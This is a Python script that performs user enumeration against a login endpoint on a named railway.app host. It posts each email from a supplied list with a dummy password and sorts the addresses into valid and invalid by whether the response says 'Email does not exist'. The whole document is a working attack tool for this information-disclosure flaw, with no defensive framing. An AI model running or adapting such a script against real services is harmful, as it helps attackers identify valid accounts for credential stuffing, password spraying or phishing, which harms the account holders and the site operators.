import requests
import sys

def check_email(email):
    url = 'https://web-production-59589.up.railway.app/functions.php'  # Updated URL
    headers = {
        'Host': 'web-production-59589.up.railway.app',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://web-production-59589.up.railway.app',
        'Connection': 'close',
        'Referer': 'https://web-production-59589.up.railway.app/',
    }
    data = {
        'username': email,
        'password': 'password',  # Dummy password to test email validity
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]
    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
